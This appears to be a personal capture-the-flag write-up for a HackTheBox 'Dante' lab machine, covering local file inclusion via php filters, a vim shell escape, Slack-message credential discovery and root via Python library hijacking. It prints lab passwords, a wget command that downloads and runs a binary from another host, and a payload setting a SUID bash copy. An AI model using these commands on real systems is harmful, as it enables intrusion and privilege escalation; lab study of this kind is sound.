# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
`FoundCREDs`

### Flags
1. `DANTE{LF1_M@K3s_u5_lol}`
2. `DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}`
## External
### Enumeration
![](https://i.imgur.com/ahZOl27.png)

![](https://i.imgur.com/JrK36iW.png)
- I saw the `?page=` and tried some php filters.
![](https://i.imgur.com/xWeq231.png)
![](https://i.imgur.com/emA0U5m.png)
![](https://i.imgur.com/yrfBDEd.png)
![](https://i.imgur.com/XWhwPjK.png)
```shell
/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );


set shell=/bin/sh|:shell

```
### Gaining Access
![](https://i.imgur.com/48LXk46.png)
- it is limited Shell, then i used vim and escalated my privilege
	- https://gtfobins.github.io/gtfobins/vim/#shell
![](https://i.imgur.com/CjcqSMr.png)
## Internal
### Enumeration
```shell
  _ /snap/slack/65/usr/lib/slack/slack --type=gpu-process --no-sandbox --enable-logging --enable-crashpad --crashpad-handler-pid=2336 --enable-crash-reporter=1d25997c-8956-4d11-a995-8cf1bcc9657a,no_channel --user-data-dir=/home/frank/snap/slack/65/.config/Slack --gpu-preferences=WAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAABAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --enable-logging --log-file=/home/frank/snap/slack/65/.config/Slack/logs/default/electron_debug.log --shared-files --field-trial-handle=0,i,9378677113187880121,9242461286356514115,131072 --disable-features=AllowAggressiveThrottlingWithWebSocket,CalculateNativeWinOcclusion,HardwareMediaKeyHandling,IntensiveWakeUpThrottling,LogJsConsoleMessages,RequestInitiatorSiteLockEnfocement,SpareRendererForSitePerProcess,WebRtcHideLocalIpsWithMdns,WinRetrieveSuggestionsOnlyOnDemand
frank       2318  0.0  1.2 33971076 48200 ?      S    Jun21   0:02  |   _ /snap/slack/65/usr/lib/slack/slack --type=zygote --no-sandbox --enable-crashpad --enable-crashpad
frank       2918  0.5  2.8 42971916 114452 ?     Sl   Jun21   3:51  |   |   _ /snap/slack/65/usr/lib/slack/slack --type=renderer --enable-crashpad --crashpad-handler-pid=2336 --enable-crash-reporter=1d25997c-8956-4d11-a995-8cf1bcc9657a,no_channel --user-data-dir=/home/frank/snap/slack/65/.config/Slack --standard-schemes=app,slack-webapp-dev --secure-schemes=app,slack-webapp-dev --bypasscsp-schemes=slack-webapp-dev --cors-schemes=slack-webapp-dev --fetch-schemes=slack-webapp-dev --service-worker-schemes=slack-webapp-dev --streaming-schemes --app-path=/snap/slack/65/usr/lib/slack/resources/app.asar --enable-sandbox --enable-blink-features=ExperimentalJSProfiler --disable-blink-features --no-sandbox --autoplay-policy=no-user-gesture-required --enable-logging --force-color-profile=srgb --log-file=/home/frank/snap/slack/65/.config/Slack/logs/default/electron_debug.log --lang=en-US --num-raster-threads=1 --renderer-client-id=6 --launch-time-ticks=342219432 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9378677113187880121,9242461286356514115,131072 --disable-features=AllowAggressiveThrottlingWithWebSocket,CalculateNativeWinOcclusion,HardwareMediaKeyHandling,IntensiveWakeUpThrottling,LogJsConsoleMessages,RequestInitiatorSiteLockEnfocement,SpareRendererForSitePerProcess,WebRtcHideLocalIpsWithMdns,WinRetrieveSuggestionsOnlyOnDemand --window-type=main
frank       2892  0.1  1.5 34040992 63424 ?      Sl   Jun21   0:52  |   _ /snap/slack/65/usr/lib/slack/slack --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --enable-logging --enable-crashpad --crashpad-handler-pid=2336 --enable-crash-reporter=1d25997c-8956-4d11-a995-8cf1bcc9657a,no_channel --user-data-dir=/home/frank/snap/slack/65/.config/Slack --standard-schemes=app,slack-webapp-dev --secure-schemes=app,slack-webapp-dev --bypasscsp-schemes=slack-webapp-dev --cors-schemes=slack-webapp-dev --fetch-schemes=slack-webapp-dev --service-worker-schemes=slack-webapp-dev --streaming-schemes --enable-logging --log-file=/home/frank/snap/slack/65/.config/Slack/logs/default/electron_debug.log --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9378677113187880121,9242461286356514115,131072 --disable-features=AllowAggressiveThrottlingWithWebSocket,CalculateNativeWinOcclusion,HardwareMediaKeyHandling,IntensiveWakeUpThrottling,LogJsConsoleMessages,RequestInitiatorSiteLockEnfocement,SpareRendererForSitePerProcess,WebRtcHideLocalIpsWithMdns,WinRetrieveSuggestionsOnlyOnDemand --enable-crashpad
frank       2336  0.0  0.0 33588528 3088 ?       Sl   Jun21   0:00  _ /snap/slack/65/usr/lib/slack/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --no-rate-limit --no-upload-gzip --database=/home/frank/snap/slack/65/.config/Slack/Crashpad --url=https://slack.com/apps/sentryproxy/api/5277886/minidump/?sentry_key=fd30fe469dbf4aec9db40548e5acf91e --annotation=_productName=Slack --annotation=_version=4.28.171 --annotation=lsb-release=Unknown --annotation=plat=Linux --annotation=prod=Electron --annotation=sentry___initialScope={"release":"Slack@4.28.171","environment":"production","user":{"id":"9267d010-0c00-5b43-b08b-288e1d53945f"},"tags":{"uuid":"9267d010-0c00-5b43-b08b-288e1d53945f"}} --annotation=ver=20.0.3 --initial-client-fd=42 --shared-client-connection


/home/margaret/.lhistory

/home/frank
/opt/omi/

╔══════════╣ Unexpected in root
/html
/1
/samba
 /bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm /home/frank/urllib.py
/snap/slack/65/usr/lib/slack/resources/app.asar
```
![](https://i.imgur.com/WlHyeqm.png)
```
"Hi Margaret, I created the channel so we can discuss the network security - in private!"
"Great idea, Frank"
"We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"
"Sure, but I need my password for the Ubuntu images, I haven't been given it yet"
"Ahh sorry about that - its STARS5678FORTUNE401"
"Thanks very much, I'll get on that now."
"No problem at all. I'll make this channel private from now on - we cant risk another breach"
"Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account"
"Thanks, will do"
"I also set you a new password on the Ubuntu box - 69F15HST1CX, same username"


thisissecretright
htb_donotuse
```
![](https://i.imgur.com/OXRbNyv.png)
![](https://i.imgur.com/r7Cmumx.png)
```
wget -qO SRpFzXCv --no-check-certificate http://172.16.1.100:4400/T44t8epgG; chmod +x SRpFzXCv; ./SRpFzXCv& disown
```
![](https://i.imgur.com/gy4IEad.png)
- ` frank : TractorHeadtorchDeskmat`
### Gaining Access
![](https://i.imgur.com/Xdvol4i.png)

![](https://i.imgur.com/ARhtaNl.png)
### Maintaining Access
![](https://i.imgur.com/09jPEQ8.png)
-  The Root is Running the Apache_restart.py.
![](https://i.imgur.com/cyLNoK4.png)
![](https://i.imgur.com/MMj92lx.png)

This File uses call and urllib from the frank.
```python
import os
os.system("cp /bin/bash /home/frank/bash; chmod u+s /home/frank/bash")
```
![](https://i.imgur.com/zdUla8q.png)


# Random Notes